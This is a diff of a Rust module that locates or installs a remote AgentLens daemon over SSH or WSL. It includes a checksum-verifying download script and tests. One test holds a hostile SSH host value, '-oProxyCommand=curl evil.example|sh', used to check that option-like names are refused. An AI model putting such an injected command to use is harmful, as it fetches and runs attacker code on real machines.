@@ -1,17 +1,176 @@
 //! Naming and reaching machines that aren't this one.
 //!
-//! Three jobs, all of them local knowledge that `agentlens-core` must not
-//! carry: how a remote workspace is written down, how the daemon is spawned
+//! Local knowledge that `agentlens-core` must not carry: how a remote
+//! workspace is written down, how the daemon is *found or installed* over
 //! there, and how a path on the far side is expressed so a Windows
 //! application can open it.
+//!
+//! ## Never trust the remote `PATH`
+//!
+//! `ssh host command` runs without a login shell, so `~/.local/bin` is
+//! usually absent from `PATH` and a perfectly well-installed daemon reports
+//! "command not found". Asking users to work around that with a settings
+//! field is asking them to solve a problem we created.
+//!
+//! So the app does what VS Code Remote does: it never names a bare command.
+//! It runs a small shell [`bootstrap`] that looks in the places the daemon
+//! could be, `exec`s the first one it finds, and — if there is none — prints
+//! a marker naming the remote's OS and architecture. That marker is what
+//! turns "the connection failed" into "the daemon isn't there yet, and here
+//! is exactly which binary it needs", which is what makes [`install_script`]
+//! possible.
 
 use std::process::Command as ProcessCommand;
 
 use agentlens_core::protocol::{CommandResult, ConnectionTarget};
 
 /// The command AgentLens runs on the far side when nothing overrides it.
-/// Bare, so a daemon on the remote `PATH` just works.
+/// Bare on purpose: it is the sentinel for "the user has expressed no
+/// preference, so find or install the daemon yourself".
 pub const DEFAULT_DAEMON_COMMAND: &str = "agentlens-daemon";
+
+/// Where AgentLens installs daemons it manages, relative to the remote user's
+/// home. Version-scoped, so upgrading the app installs alongside rather than
+/// over the top — and so a running daemon is never the file being replaced.
+const INSTALL_ROOT: &str = ".agentlens/bin";
+
+/// Printed by [`bootstrap`] when it found nothing to run. The two fields after
+/// it are `uname -s` and `uname -m`.
+const NOT_INSTALLED: &str = "agentlens-bootstrap: not-installed";
+
+/// Where release assets are fetched from, for a remote that installs its own.
+const RELEASES: &str = "https://github.com/harrison-wallace/AgentLens/releases/download";
+
+/// What the remote reported about itself when it had no daemon to offer.
+#[derive(Debug, Clone, PartialEq, Eq)]
+pub struct Platform {
+    /// `uname -s` — `Linux`, `Darwin`, …
+    pub os: String,
+    /// `uname -m` — `x86_64`, `aarch64`, `arm64`, …
+    pub arch: String,
+}
+
+impl Platform {
+    /// The release asset this platform needs, or `None` if AgentLens does not
+    /// publish a daemon for it — in which case the user is told that rather
+    /// than watching a download fail.
+    pub fn asset(&self) -> Option<&'static str> {
+        match (self.os.as_str(), self.arch.as_str()) {
+            ("Linux", "x86_64" | "amd64") => Some("agentlens-daemon-linux-x86_64"),
+            ("Linux", "aarch64" | "arm64") => Some("agentlens-daemon-linux-aarch64"),
+            _ => None,
+        }
+    }
+
+    pub fn describe(&self) -> String {
+        format!("{} {}", self.os, self.arch)
+    }
+}
+
+/// The shell AgentLens runs on the far side to find a daemon and become one.
+///
+/// Ordered most-specific first: the copy this exact app version installed, then
+/// the conventional manual locations, then whatever `PATH` offers. Finding a
+/// manually installed daemon matters as much as installing one — someone who
+/// has already run the `curl` from the setup guide should not need to configure
+/// anything.
+///
+/// `exec` rather than a plain call so the daemon replaces this shell and owns
+/// the stdio it was handed; an intermediate `sh` would sit between the app and
+/// the protocol stream and swallow the EOF that means "shut down".
+pub fn bootstrap(version: &str) -> String {
+    format!(
+        r#"V={version}
+D="$HOME/{root}/$V/agentlens-daemon"
+if [ -x "$D" ]; then exec "$D" --stdio; fi
+for d in "$HOME/.local/bin/agentlens-daemon" /usr/local/bin/agentlens-daemon /usr/bin/agentlens-daemon; do
+  if [ -x "$d" ]; then exec "$d" --stdio; fi
+done
+if command -v agentlens-daemon >/dev/null 2>&1; then exec agentlens-daemon --stdio; fi
+echo "{marker} $(uname -s) $(uname -m)" >&2
+exit 127
+"#,
+        version = version,
+        root = INSTALL_ROOT,
+        marker = NOT_INSTALLED,
+    )
+}
+
+/// Read the bootstrap's marker out of whatever the remote wrote to stderr.
+///
+/// `None` means the connection failed for some other reason — bad host, refused
+/// auth, no `sh` — and must be reported as itself rather than as a missing
+/// daemon we could helpfully install.
+pub fn parse_not_installed(stderr: &str) -> Option<Platform> {
+    let line = stderr.lines().find(|line| line.contains(NOT_INSTALLED))?;
+    let rest = line.split(NOT_INSTALLED).nth(1)?;
+    let mut fields = rest.split_whitespace();
+    Some(Platform {
+        os: fields.next()?.to_string(),
+        arch: fields.next()?.to_string(),
+    })
+}
+
+/// The shell that puts a daemon on a remote that hasn't got one.
+///
+/// Downloaded by the remote rather than pushed from here, which is both what
+/// VS Code does and the only thing that works when the app is on Windows and
+/// the remote is Linux — this machine may have no copy of the right binary.
+///
+/// Integrity: `SHA256SUMS` is fetched alongside and checked when the release
+/// publishes one. A release without it still installs (the transport is HTTPS
+/// to GitHub, and the handshake immediately afterwards proves the binary is
+/// the right version), but says so on stderr rather than pretending.
+pub fn install_script(version: &str, asset: &str) -> String {
+    format!(
+        r#"V={version}
+DIR="$HOME/{root}/$V"
+TMP="$DIR/.download.$$"
+ASSET={asset}
+BASE={releases}/v$V
+if ! mkdir -p "$DIR"; then echo "agentlens-install: cannot create $DIR" >&2; exit 1; fi
+trap 'rm -f "$TMP" "$TMP.sums"' EXIT
+# Bounded, because a download that hangs forever hangs the app behind it.
+if command -v curl >/dev/null 2>&1; then
+  fetch() {{ curl -fsSL --max-time 300 "$1" -o "$2"; }}
+elif command -v wget >/dev/null 2>&1; then
+  fetch() {{ wget -q --timeout=60 --tries=2 -O "$2" "$1"; }}
+else
+  echo "agentlens-install: neither curl nor wget is available" >&2
+  exit 1
+fi
+if ! fetch "$BASE/$ASSET" "$TMP"; then
+  echo "agentlens-install: could not download $BASE/$ASSET" >&2
+  exit 1
+fi
+if fetch "$BASE/SHA256SUMS" "$TMP.sums" 2>/dev/null; then
+  want=$(grep " $ASSET$" "$TMP.sums" | cut -d' ' -f1)
+  if command -v sha256sum >/dev/null 2>&1; then got=$(sha256sum "$TMP" | cut -d' ' -f1)
+  elif command -v shasum >/dev/null 2>&1; then got=$(shasum -a 256 "$TMP" | cut -d' ' -f1)
+  else got=""; fi
+  if [ -n "$want" ] && [ -n "$got" ] && [ "$want" != "$got" ]; then
+    echo "agentlens-install: checksum mismatch for $ASSET" >&2
+    exit 1
+  fi
+else
+  echo "agentlens-install: this release publishes no SHA256SUMS; skipping checksum" >&2
+fi
+chmod +x "$TMP" || exit 1
+mv -f "$TMP" "$DIR/agentlens-daemon" || exit 1
+# Old versions are dead weight the moment this one works. Confined to our own
+# directory, and never the version just installed.
+for old in "$HOME/{root}"/*; do
+  case "$old" in "$DIR") continue;; esac
+  [ -d "$old" ] && rm -rf "$old"
+done
+exec "$DIR/agentlens-daemon" --version
+"#,
+        version = version,
+        root = INSTALL_ROOT,
+        asset = asset,
+        releases = RELEASES,
+    )
+}
 
 /// Write a workspace root down in a way that survives being put in a list of
 /// recent workspaces and clicked a week later.
@@ -64,20 +223,49 @@ fn with_leading_slash(root: &str) -> String {
 
 /// The program and arguments that start a daemon for `target`.
 ///
+/// When `daemon` is the default sentinel this runs [`bootstrap`], which finds
+/// the daemon wherever it actually is. When the user has named a command, that
+/// command is run verbatim — an explicit setting is an instruction, not a hint,
+/// and it stays the escape hatch for anything the bootstrap cannot cope with
+/// (a Windows remote whose shell is `cmd.exe`, say).
+///
 /// `None` for a local target (there is no process to spawn, the engine is
 /// already here) and for a host or distro name that would be read as an
 /// option — see [`is_option_like`].
-pub fn spawn_spec(target: &ConnectionTarget, daemon: &str) -> Option<(String, Vec<String>)> {
-    let daemon = if daemon.trim().is_empty() {
-        DEFAULT_DAEMON_COMMAND
+pub fn spawn_spec(
+    target: &ConnectionTarget,
+    daemon: &str,
+    version: &str,
+) -> Option<(String, Vec<String>)> {
+    let daemon = daemon.trim();
+    let script = if daemon.is_empty() || daemon == DEFAULT_DAEMON_COMMAND {
+        bootstrap(version)
     } else {
-        daemon.trim()
+        format!("exec {} --stdio", shell_quote(daemon))
     };
+    remote_shell(target, &script)
+}
+
+/// The program and arguments that install a daemon on `target`.
+pub fn install_spec(
+    target: &ConnectionTarget,
+    version: &str,
+    asset: &str,
+) -> Option<(String, Vec<String>)> {
+    remote_shell(target, &install_script(version, asset))
+}
+
+/// Run `script` under `/bin/sh` on the far side.
+///
+/// The two transports differ only in how the argv survives the trip: `wsl.exe`
+/// passes everything after `--` through untouched, while `ssh` concatenates its
+/// trailing arguments and hands the result to the *remote shell* — so that one
+/// has to be quoted or a script full of spaces and quotes arrives shredded.
+fn remote_shell(target: &ConnectionTarget, script: &str) -> Option<(String, Vec<String>)> {
     match target {
         ConnectionTarget::Local => None,
-        // `--` ends wsl.exe's own option parsing, so a daemon path starting
-        // with a dash can't be mistaken for a wsl flag. Arguments after it are
-        // passed through without a shell, so nothing needs quoting.
+        // `--` also ends wsl.exe's own option parsing, so nothing in the
+        // script can be mistaken for a wsl flag.
         ConnectionTarget::Wsl { distro } => (!is_option_like(distro)).then(|| {
             (
                 "wsl.exe".to_string(),
@@ -85,17 +273,16 @@ pub fn spawn_spec(target: &ConnectionTarget, daemon: &str) -> Option<(String, Ve
                     "-d".to_string(),
                     distro.clone(),
                     "--".to_string(),
-                    daemon.to_string(),
-                    "--stdio".to_string(),
+                    "sh".to_string(),
+                    "-c".to_string(),
+                    script.to_string(),
                 ],
             )
         }),
-        // ssh concatenates its trailing arguments and hands the result to the
-        // remote *shell*, so this one does need quoting.
         ConnectionTarget::Ssh { host } => (!is_option_like(host)).then(|| {
             (
                 "ssh".to_string(),
-                vec![host.clone(), format!("{} --stdio", shell_quote(daemon))],
+                vec![host.clone(), format!("sh -c {}", shell_quote(script))],
             )
         }),
     }
@@ -138,6 +325,39 @@ pub fn to_local_path(target: &ConnectionTarget, path: &str) -> CommandResult<Str
              Preview and diff work; opening in another application does not."
         )),
     }
+}
+
+/// Install the daemon on `target` and return what it reports about itself.
+///
+/// Runs as its own short-lived process rather than over the protocol channel:
+/// there is no daemon to talk to yet, which is the entire point.
+pub fn provision(target: &ConnectionTarget, version: &str, asset: &str) -> CommandResult<String> {
+    let (program, args) =
+        install_spec(target, version, asset).ok_or("this connection cannot be installed to")?;
+
+    let mut command = ProcessCommand::new(&program);
+    command.args(&args);
+    #[cfg(windows)]
+    {
+        use std::os::windows::process::CommandExt;
+        const CREATE_NO_WINDOW: u32 = 0x0800_0000;
+        command.creation_flags(CREATE_NO_WINDOW);
+    }
+
+    let output = command
+        .output()
+        .map_err(|e| format!("failed to run `{program}`: {e}"))?;
+
+    if !output.status.success() {
+        let reason = String::from_utf8_lossy(&output.stderr);
+        let reason = reason.trim();
+        return Err(if reason.is_empty() {
+            format!("the install failed on {}", target.label())
+        } else {
+            format!("the install failed on {}:\n{reason}", target.label())
+        });
+    }
+    Ok(String::from_utf8_lossy(&output.stdout).trim().to_string())
 }
 
 /// WSL distros installed on this machine, as `wsl.exe -l -q` reports them.
@@ -229,41 +449,261 @@ mod tests {
     }
 
     #[test]
-    fn wsl_spawns_through_the_launcher_with_options_terminated() {
-        let (program, args) = spawn_spec(&wsl("Ubuntu-22.04"), "").unwrap();
+    fn wsl_runs_the_bootstrap_under_sh_with_options_terminated() {
+        let (program, args) = spawn_spec(&wsl("Ubuntu-22.04"), "", "0.1.0").unwrap();
         assert_eq!(program, "wsl.exe");
+        assert_eq!(args[..5], ["-d", "Ubuntu-22.04", "--", "sh", "-c"]);
+        // Passed through untouched by wsl.exe, so the script needs no quoting.
+        assert_eq!(args[5], bootstrap("0.1.0"));
+    }
+
+    #[test]
+    fn ssh_quotes_the_whole_script_for_the_remote_shell() {
+        let (program, args) = spawn_spec(&ssh("box"), "", "0.1.0").unwrap();
+        assert_eq!(program, "ssh");
+        assert_eq!(args[0], "box");
         assert_eq!(
-            args,
-            vec!["-d", "Ubuntu-22.04", "--", "agentlens-daemon", "--stdio"]
+            args[1],
+            format!("sh -c {}", shell_quote(&bootstrap("0.1.0")))
         );
     }
 
     #[test]
-    fn ssh_quotes_the_remote_command_for_the_remote_shell() {
-        let (program, args) = spawn_spec(&ssh("box"), "/opt/my daemons/agentlens-daemon").unwrap();
-        assert_eq!(program, "ssh");
-        assert_eq!(args[0], "box");
-        assert_eq!(args[1], "'/opt/my daemons/agentlens-daemon' --stdio");
+    fn an_explicit_daemon_command_is_run_verbatim() {
+        // The escape hatch has to stay literal: it is what rescues anything
+        // the bootstrap can't cope with.
+        let (_, args) =
+            spawn_spec(&ssh("box"), "/opt/my daemons/agentlens-daemon", "0.1.0").unwrap();
+        assert_eq!(
+            args[1],
+            r#"sh -c 'exec '\''/opt/my daemons/agentlens-daemon'\'' --stdio'"#
+        );
 
-        let (_, args) = spawn_spec(&ssh("box"), "/opt/it's/daemon").unwrap();
-        assert_eq!(args[1], r"'/opt/it'\''s/daemon' --stdio");
+        let (_, args) = spawn_spec(&wsl("Ubuntu"), "/opt/daemon", "0.1.0").unwrap();
+        assert_eq!(args[5], "exec '/opt/daemon' --stdio");
     }
 
     #[test]
     fn local_has_nothing_to_spawn() {
-        assert!(spawn_spec(&ConnectionTarget::Local, "").is_none());
+        assert!(spawn_spec(&ConnectionTarget::Local, "", "0.1.0").is_none());
+        assert!(install_spec(&ConnectionTarget::Local, "0.1.0", "x").is_none());
     }
 
     #[test]
     fn a_name_that_would_be_read_as_an_option_is_refused() {
         // `ssh -oProxyCommand=… host` runs an arbitrary command, and ssh has
         // no `--` to hide behind.
-        assert!(spawn_spec(&ssh("-oProxyCommand=curl evil.example|sh"), "").is_none());
-        assert!(spawn_spec(&ssh("  -oBatchMode=no"), "").is_none());
-        assert!(spawn_spec(&wsl("--shell-type"), "").is_none());
+        assert!(spawn_spec(&ssh("-oProxyCommand=curl evil.example|sh"), "", "0.1.0").is_none());
+        assert!(spawn_spec(&ssh("  -oBatchMode=no"), "", "0.1.0").is_none());
+        assert!(spawn_spec(&wsl("--shell-type"), "", "0.1.0").is_none());
+        assert!(install_spec(&ssh("-oProxyCommand=x"), "0.1.0", "a").is_none());
         // Dashes elsewhere are perfectly ordinary names.
-        assert!(spawn_spec(&ssh("build-box"), "").is_some());
-        assert!(spawn_spec(&wsl("Ubuntu-22.04"), "").is_some());
+        assert!(spawn_spec(&ssh("build-box"), "", "0.1.0").is_some());
+        assert!(spawn_spec(&wsl("Ubuntu-22.04"), "", "0.1.0").is_some());
+    }
+
+    #[test]
+    fn the_bootstrap_prefers_our_install_then_manual_ones_then_path() {
+        let script = bootstrap("0.1.0");
+        let ours = script.find(".agentlens/bin").unwrap();
+        let manual = script.find(".local/bin/agentlens-daemon").unwrap();
+        let usr = script.find("/usr/local/bin/agentlens-daemon").unwrap();
+        let path = script.find("command -v agentlens-daemon").unwrap();
+
+        assert!(ours < manual && manual < usr && usr < path, "{script}");
+        // A found daemon must replace the shell, or an `sh` sits between the
+        // app and the protocol stream.
+        assert!(script.contains(r#"exec "$D" --stdio"#), "{script}");
+    }
+
+    #[test]
+    fn a_bootstrap_that_found_nothing_names_the_platform() {
+        let stderr = "some ssh banner\nagentlens-bootstrap: not-installed Linux aarch64\n";
+        let platform = parse_not_installed(stderr).unwrap();
+
+        assert_eq!(platform.os, "Linux");
+        assert_eq!(platform.arch, "aarch64");
+        assert_eq!(platform.asset(), Some("agentlens-daemon-linux-aarch64"));
+    }
+
+    #[test]
+    fn other_failures_are_not_mistaken_for_a_missing_daemon() {
+        // Reporting "the daemon isn't installed" for a refused login would
+        // send the user off installing something that is already there.
+        for stderr in [
+            "",
+            "Permission denied (publickey).",
+            "ssh: Could not resolve hostname nope",
+            "bash: line 1: sh: command not found",
+        ] {
+            assert_eq!(parse_not_installed(stderr), None, "{stderr}");
+        }
+    }
+
+    #[test]
+    fn a_platform_with_no_published_daemon_says_so_rather_than_guessing() {
+        let unsupported = Platform {
+            os: "FreeBSD".into(),
+            arch: "riscv64".into(),
+        };
+        assert_eq!(unsupported.asset(), None);
+        assert_eq!(unsupported.describe(), "FreeBSD riscv64");
+
+        // Both names the world uses for 64-bit ARM map to one asset.
+        for arch in ["aarch64", "arm64"] {
+            assert_eq!(
+                Platform {
+                    os: "Linux".into(),
+                    arch: arch.into()
+                }
+                .asset(),
+                Some("agentlens-daemon-linux-aarch64")
+            );
+        }
+    }
+
+    /// Run the bootstrap the way a remote would: `sh -c`, with a home
+    /// directory we control and a `PATH` that has nothing helpful on it.
+    ///
+    /// Asserting on the *text* of a shell script proves it was written; only
+    /// running it proves it works. These are `unix` because they need a POSIX
+    /// `sh` — on Windows the WSL smoke test in `child.rs` covers the same
+    /// ground against a real distro.
+    #[cfg(unix)]
+    fn run_bootstrap(home: &std::path::Path, version: &str) -> std::process::Output {
+        ProcessCommand::new("sh")
+            .arg("-c")
+            .arg(bootstrap(version))
+            .env_clear()
+            .env("HOME", home)
+            .env("PATH", "/usr/bin:/bin")
+            .output()
+            .expect("sh must be runnable")
+    }
+
+    /// A stand-in daemon that announces which copy of itself ran.
+    #[cfg(unix)]
+    fn stub_daemon(at: &std::path::Path, label: &str) {
+        use std::os::unix::fs::PermissionsExt;
+        std::fs::create_dir_all(at.parent().unwrap()).unwrap();
+        std::fs::write(at, format!("#!/bin/sh\necho '{label}' \"$@\"\n")).unwrap();
+        std::fs::set_permissions(at, std::fs::Permissions::from_mode(0o755)).unwrap();
+    }
+
+    #[cfg(unix)]
+    #[test]
+    fn the_bootstrap_runs_a_daemon_it_finds_and_passes_stdio() {
+        let home = tempfile::tempdir().unwrap();
+        stub_daemon(
+            &home.path().join(".local/bin/agentlens-daemon"),
+            "manual-install",
+        );
+
+        let out = run_bootstrap(home.path(), "0.1.0");
+
+        assert!(out.status.success(), "{:?}", out);
+        assert_eq!(
+            String::from_utf8_lossy(&out.stdout).trim(),
+            "manual-install --stdio"
+        );
+    }
+
+    #[cfg(unix)]
+    #[test]
+    fn the_bootstrap_prefers_the_version_it_manages_over_a_manual_one() {
+        // Someone with an old hand-placed daemon must still get the one this
+        // app installed, or an upgrade would silently keep talking to the
+        // previous protocol.
+        let home = tempfile::tempdir().unwrap();
+        stub_daemon(&home.path().join(".local/bin/agentlens-daemon"), "manual");
+        stub_daemon(
+            &home.path().join(".agentlens/bin/0.1.0/agentlens-daemon"),
+            "managed",
+        );
+
+        let out = run_bootstrap(home.path(), "0.1.0");
+
+        assert_eq!(
+            String::from_utf8_lossy(&out.stdout).trim(),
+            "managed --stdio"
+        );
+    }
+
+    #[cfg(unix)]
+    #[test]
+    fn the_bootstrap_ignores_a_managed_daemon_of_another_version() {
+        let home = tempfile::tempdir().unwrap();
+        stub_daemon(
+            &home.path().join(".agentlens/bin/0.0.9/agentlens-daemon"),
+            "stale",
+        );
+
+        let out = run_bootstrap(home.path(), "0.1.0");
+
+        assert_eq!(out.status.code(), Some(127));
+        assert!(parse_not_installed(&String::from_utf8_lossy(&out.stderr)).is_some());
+    }
+
+    #[cfg(unix)]
+    #[test]
+    fn the_bootstrap_reports_a_real_platform_when_it_finds_nothing() {
+        let home = tempfile::tempdir().unwrap();
+
+        let out = run_bootstrap(home.path(), "0.1.0");
+
+        assert_eq!(out.status.code(), Some(127), "must not look like success");
+        assert!(out.stdout.is_empty(), "the marker belongs on stderr only");
+
+        let platform = parse_not_installed(&String::from_utf8_lossy(&out.stderr))
+            .expect("the marker must be parseable");
+        // Not hardcoded: this is whatever machine is running the tests, which
+        // is the point — the values come from `uname` on the far side.
+        assert!(!platform.os.is_empty() && !platform.arch.is_empty());
+        assert!(
+            platform.asset().is_some(),
+            "{platform:?} should be supported"
+        );
+    }
+
+    #[cfg(unix)]
+    #[test]
+    fn a_non_executable_file_is_not_mistaken_for_a_daemon() {
+        // A half-finished download, or a file saved without the +x bit, must
+        // fall through to the next candidate rather than fail the connection.
+        let home = tempfile::tempdir().unwrap();
+        let dud = home.path().join(".agentlens/bin/0.1.0/agentlens-daemon");
+        std::fs::create_dir_all(dud.parent().unwrap()).unwrap();
+        std::fs::write(&dud, "not executable").unwrap();
+        stub_daemon(&home.path().join(".local/bin/agentlens-daemon"), "fallback");
+
+        let out = run_bootstrap(home.path(), "0.1.0");
+
+        assert_eq!(
+            String::from_utf8_lossy(&out.stdout).trim(),
+            "fallback --stdio"
+        );
+    }
+
+    #[test]
+    fn the_installer_downloads_verifies_and_replaces_atomically() {
+        let script = install_script("0.1.0", "agentlens-daemon-linux-x86_64");
+
+        assert!(script.contains("releases/download/v$V"), "{script}");
+        assert!(script.contains("SHA256SUMS"), "{script}");
+        assert!(script.contains("checksum mismatch"), "{script}");
+        // Downloaded beside the target and renamed, never written in place —
+        // replacing a running binary is how you earn ETXTBSY.
+        assert!(
+            script.contains(r#"mv -f "$TMP" "$DIR/agentlens-daemon""#),
+            "{script}"
+        );
+        // Neither curl nor wget is a real possibility on a minimal image.
+        assert!(script.contains("neither curl nor wget"), "{script}");
+        // Pruning must never escape our own directory.
+        assert!(
+            script.contains(r#"for old in "$HOME/.agentlens/bin"/*"#),
+            "{script}"
+        );
     }
 
     #[test]
